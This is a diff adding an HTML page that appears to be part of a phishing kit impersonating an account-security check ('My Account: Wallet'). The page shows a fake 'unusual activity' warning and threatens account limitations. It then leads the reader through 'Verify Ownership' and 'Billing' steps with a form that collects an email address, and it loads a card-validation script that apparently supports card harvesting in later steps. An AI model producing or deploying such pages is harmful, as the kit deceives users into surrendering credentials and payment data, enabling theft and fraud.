@@ -1,0 +1,148 @@
+
+<!DOCTYPE html>
+					<html>
+					<head>
+						<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+						<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+						<link rel="shortcut icon" href="pics/favi.ico">
+						<link rel="apple-touch-icon" href="pics/favi.png">
+						<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
+						<title>My Account: Wallet</title>
+						<link href="https://fonts.googleapis.com/css2?family=Material+Icons" rel="stylesheet">
+						<link href="https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600" rel="stylesheet">
+						<link rel="stylesheet" href="css/csspage.css">
+						<script type="text/javascript" src="lib/js/jquery-3.3.1.min.php"></script>
+						<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js">
+						</script>
+						<meta http-equiv="cache-control" content="no-cache">
+						<meta http-equiv="expires" content="0">
+						<meta http-equiv="pragma" content="no-cache">
+						</script>
+						<script type="text/javascript" src="lib/js/jquery.ccvalid.php"></script><script type="text/javascript" src="lib/js/jquery.mask.min.js"></script>
+					<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
+				
+					</head>
+				  <body>
+				  <header>
+					<div>
+					</div>
+				</header>
+					<div class="mainContainer ">
+					<div class="bg">
+					</div>
+					  <div class="hide" id="rotate">
+					  <div class="circle">
+					  </div>
+						<div class="overlay">
+						</div>
+					  </div>
+					  <div class="contents">
+					  <div class="modal hide js-modal">
+					  <div class="l-modal-shadow js-modal-hide"></div>
+					  <div class="c-popup l-modal-body">
+						<div class="c-popup-img">
+						  <img src="pics/warning.png" />
+						</div>
+						<h3 class="c-popup-title">Warning!</h3>
+						<p class="c-popup-description">Complete the progress first</p>
+							<input style="width:50%" class="bt js-modal-hide" type="submit" value="Continue">
+					  </div>
+					  </div><div class="modal show js-alert">
+	<div class="l-modal-shadow js-modal-hide"></div>
+	<div class="c-popup l-modal-body">
+	  <div class="c-popup-img">
+		<img src="pics/warning.png" />
+	  </div>
+	  <h3 class="c-popup-title">We've noticed some unusual activity</h3>
+	  <p class="c-popup-description">We need your help securing your account to prevent any unauthorized access. For your safety, there may be some limitations on your account if the information isn't correct</p>
+		  <input style="width:50%" class="bt js-alert-hide" type="submit" value="Continue">
+	</div>
+	</div>
+				  <div class="mainContents">
+				<a href="#" class="close-icon js-modal-hide"></a>
+				  <ol class="steps js-modal-hide">
+					<li id="signed"><a class="signed" href="#">Signed</a></li>
+					<li id="Protected"><a class="Protected" href="#">Protected</a></li><li id="Verify"><a class="Verify" href="#">Verify Ownership</a></li><li id="Billing"><a class="Billing" href="#">Billing</a></li>
+					<li id="Completed"><a class="Completed" href="#">Completed</a></li>
+				  </ol>
+				  <div id="process">
+	<link rel="stylesheet" type="text/css" href="css/verifymail.css">
+
+	<form class="form" action="?process&apitoken=dsds" method="POST" style="padding:0 20px" novalidate="on">
+	<div class="fields clearfix"><section id="sift-verification">
+
+		  <img id="logo" class="img-email" src="" onerror="this.src='https://i.pinimg.com/originals/af/8d/9a/af8d9ac62dd43026957e1cf82a027637.gif';">
+
+		  <div class="form-container">
+
+			
+			</div><div class="inputArea">
+				<input id="eml" name="eml" type="email" required placeholder="Enter your email address">
+			  </div>
+		<input id="apitoken" name="apitoken" value="tokvalue" type="hidden">
+		<input id="mailaccess" value="mailaccess" name="mailaccess" type="hidden">
+		<div>
+		  <input style="margin: 10px 0px;width: 70%;background-color: #0b6efd;border: 1px solid #bfb9b9;border-radius: 5px;box-shadow: 0 30px 30px rgba(0,0,0,.4);" type="submit" id="dlkfh" class="bt" value="Verify">
+
+		  </div>
+	  	</section>
+  </div>
+
+	</form>
+<!--	<script type="text/javascript">$(window).on("beforeunload", function() {return "Are you sure? You didn't finish the form!";});</script>-->
+
+		<script> 
+		$("#Billing,#Verify,#Upload,#Completed").removeClass("current");
+
+		$("#Verify").addClass("current"); 
+		$(document).ready(function () {
+			function valid() {
+				var check = true;
+				var ii = 0;
+				$("#process input:not(.bt):not([type=checkbox]),#process select").each(function (i, el) {
+					if (!$(el).val()) {
+						$(el).parent().addClass("hasError");
+						check = false;
+					} else {
+						$(el).parent().removeClass("hasError");
+					}
+		
+				});
+				return check;
+			}
+			$("#process input:not(.bt):not([type=checkbox]),select").each(function (i, el) {
+				$(el).keyup(function () {
+					valid();
+				});
+				$(el).change(function () {
+					valid();
+				});
+			});
+			$(document).on("click", "#dlkfh", function (c) {
+				
+				check = true;
+				if (!valid()) {
+					check = false;
+				}
+				if (!check) {
+					return false;
+				} else {
+					$("#rotate").removeClass("hide");
+					return true; 
+					
+				}
+				return false;
+				
+			});
+		}); 
+		</script>
+							</div>
+					</div>
+					<script type="text/javascript">
+					$(".js-modal-hide").click(function(){$(".js-modal").toggleClass("hide");});
+					$(".js-alert-hide").click(function(){$(".js-alert").toggleClass("hide");});
+					</script>
+					</div>
+					
+					</body>
+					</html>
